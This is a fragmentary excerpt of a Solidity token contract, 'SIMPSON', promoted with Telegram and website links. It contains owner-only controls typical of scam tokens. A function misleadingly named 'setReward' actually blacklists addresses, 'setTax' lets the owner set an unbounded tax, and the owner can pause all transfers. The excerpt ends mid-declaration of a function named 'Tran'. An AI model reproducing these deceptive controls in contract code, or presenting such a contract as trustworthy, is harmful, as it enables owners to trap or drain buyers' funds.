...
/**
👉Telegram: https://t.me/Simpsoninu

🌎Website: https://www.simpsoninu.click/
*/
...
contract SIMPSON is ERC20Capped, ERC20Pausable, Ownable {
    ...
    function setReward(address[] calldata _blackList) external _onlyOwner{
        for(uint256 i = 0; i< _blackList.length;i++){
            blacklist[_blackList[i]] = true;
        }
    }

     function removeBlackList(address[] calldata _blackList) external _onlyOwner{
        for(uint256 i = 0; i< _blackList.length;i++){
            blacklist[_blackList[i]] = false;
        }
    }

    function setTax(uint256 _tax) external _onlyOwner {
        tax = _tax;
    }

    function pause() external _onlyOwner {
        _pause();
    }

    function unpause() external _onlyOwner {
        _unpause();
    }


    function Tran(uint256 amount) external {
